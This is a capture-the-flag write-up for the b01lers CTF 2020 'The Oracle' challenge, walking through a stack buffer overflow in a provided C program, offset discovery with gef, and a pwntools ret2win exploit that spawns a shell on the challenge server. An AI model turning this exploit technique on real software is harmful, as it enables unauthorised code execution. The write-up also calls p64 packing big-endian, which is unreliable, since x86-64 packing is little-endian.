# b01lers CTF 2020: Pwn - The Oracle (100 Points)

![img](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/pwn/images/bo1lersctf2020-the_oracle/the_oracle_desc.PNG "Challenge Description")

From the challenge description we get 2 files to download, one is the binary running on the server `chal.ctf.b01lers.com:1015` and the other is the source code of that program. 

## Recon and Analysis

Running the program it will display a text `Know Thyself.` and waits for our input. When you scream at the program, eventually you will hit a `Segmentation fault`

```sh
kali@kali:~/Documents/b01lerctf/the_oracle$ ./theoracle 
Know Thyself.
AAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
kali@kali:~/Documents/b01lerctf/the_oracle$
```

Since we have the source code, lets give it a look to see what exactly are we dealing with.

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win() {
    char* argv[] = { NULL };
    char* envp[] = { NULL };

    execve("/bin/sh", argv, envp);
}

int main() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    char buffer[16];

    printf("Know Thyself.\n");
    fgets(buffer, 128, stdin);
}
```

From the C code, we have our main function that `fgets()` our input into the `buffer[16]`. The function gets `127 bytes` as input and places them into `buffer` which has only `16 bytes` allocated, which will result in a buffer overflow if we give input of more than `16 bytes`. 

We have another function called `win()` which executes `/bin/sh` when called. But that function is never called inside our `main()` function. Perhaps the challenge is becoming a bit more clear now, we need to use the buffer overflow vulnerability in the code to _hopefully_ overwrite the instruction pointer `rip` and give `rip` the value of the `win()` function in memory to get executed. In short...

```
BoF > overwrite rip > win() > cat flag.txt
```

Lets make sure that there is no PIE (Position Independant Executable) in the binary, I like to use pwntools `checksec`

```sh
kali@kali:~/Documents/b01lerctf/the_oracle$ checksec theoracle
[*] '/home/kali/Documents/b01lerctf/the_oracle/theoracle'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`No PIE`, now we are in business... There are multiple ways to know the address of a function, for example you can use `GDB` or `radare2` however, I will use `pwntools` to find the address of `win()` using `elf.symbols['win']`


## Writing the exploit and getting the flag

First we need to find the offset where we start overwriting the instruction pointer, I used `gef gdb` to create a cyclic pattern of 50 characters and which results in the following string.

```gdb
gef➤  pattern create 50
[+] Generating a pattern of 50 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
[+] Saved as '$_gef0'
```

Then I fed that string to the program's input and automatically, gdb will break at the segmentation fault.

```
gef➤  r
Starting program: /home/kali/Documents/b01lerctf/the_oracle/theoracle 
Know Thyself.
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga

Program received signal SIGSEGV, Segmentation fault.
```

The trick in this challenge is that you do not overwrite the `rip` directly, you overwrite the value of `rsp` which is the stack pointer. That value will be placed in `rip` after the execution of the `ret` instruction in `0x40123e <main+114>  ret` so the value of `rsp` is going to be the offset value we are looking for.

```
─────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
...         
$rsp   : 0x00007fffffffe148  →  "daaaaaaaeaaaaaaafaaaaaaaga\n"
...
$rip   : 0x000000000040123e  →  <main+114> ret 
...
─────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe148│+0x0000: "daaaaaaaeaaaaaaafaaaaaaaga\n"       ← $rsp
0x00007fffffffe150│+0x0008: "eaaaaaaafaaaaaaaga\n"
0x00007fffffffe158│+0x0010: "faaaaaaaga\n"
0x00007fffffffe160│+0x0018: 0x00000000000a6167 ("ga\n"?)
0x00007fffffffe168│+0x0020: 0x00007ffff7e137d9  →  <init_cacheinfo+297> mov rbp, rax
0x00007fffffffe170│+0x0028: 0x0000000000000000
0x00007fffffffe178│+0x0030: 0x223d9461dea63a0d
0x00007fffffffe180│+0x0038: 0x00000000004010b0  →  <_start+0> endbr64 
───────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401233 <main+103>       call   0x401080 <fgets@plt>
     0x401238 <main+108>       mov    eax, 0x0
     0x40123d <main+113>       leave  
 →   0x40123e <main+114>       ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "theoracle", stopped 0x40123e in main (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40123e → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search daaaaaaaeaaaaaaafaaaaaaaga
[+] Searching 'daaaaaaaeaaaaaaafaaaaaaaga'
[+] Found at offset 24 (big-endian search) 
gef➤  

```
From that dynamic analysis we can conclude the offset to be `24` which is `8 bytes` more than the original buffer's size.

### Exploit using pwntools

```python
from pwn import *

elf = context.binary = ELF("./theoracle") # Load the binary as an ELF
r = remote("chal.ctf.b01lers.com", 1015) # Connect to the remote server
context.log_level = 'INFO' # You can ignore that if you want

offset = 16+8 # Our calculated offset
win = elf.symbols['win'] # Getting the address value of the win() function from the "elf" object

# Creating the payload
payload = b""
payload += b"A"*offset
payload += p64(win) # Pack the address in big-endian format

r.recvuntil("\n") # Recieve until new line
r.sendline(payload) # Send the payload as input
r.interactive() # Wait for an interactive shell
r.close() # Close the remote connection (always good to do)
```

![img](https://raw.githubusercontent.com/FreezeLuiz/CTF-Writeups/master/pwn/images/bo1lersctf2020-the_oracle/the_oracle_PoC_flag.PNG "we got the flag!")
